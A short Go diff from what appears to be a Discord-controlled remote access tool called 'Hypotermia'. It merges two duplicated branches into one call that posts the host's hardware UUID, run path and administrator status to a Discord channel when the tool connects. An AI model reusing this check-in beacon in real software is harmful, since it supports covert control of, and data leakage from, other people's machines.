@@ -106,31 +106,17 @@ func Init() {
 		msg = "Hypotermia successfully reconnected."
 	}
 
-	if code == 1 {
-		dg.ChannelMessageSend(
-			channel,
-			fmt.Sprintf(
-				"@here\n\n"+
-					"%s\n"+
-					"UUID: %s\n"+
-					"Running in: %s\n"+
-					"Running as: %s\n",
-				msg, hwid, path, admin,
-			),
-		)
-	} else if code == 2 {
-		dg.ChannelMessageSend(
-			channel,
-			fmt.Sprintf(
-				"@here\n\n"+
-					"%s\n"+
-					"UUID: %s\n"+
-					"Running in: %s\n"+
-					"Running as: %s\n",
-				msg, hwid, path, admin,
-			),
-		)
-	}
+	dg.ChannelMessageSend(
+		channel,
+		fmt.Sprintf(
+			"@here\n\n"+
+				"%s\n"+
+				"UUID: %s\n"+
+				"Running in: %s\n"+
+				"Running as: %s\n",
+			msg, hwid, path, admin,
+		),
+	)
 
 	select {}
 }
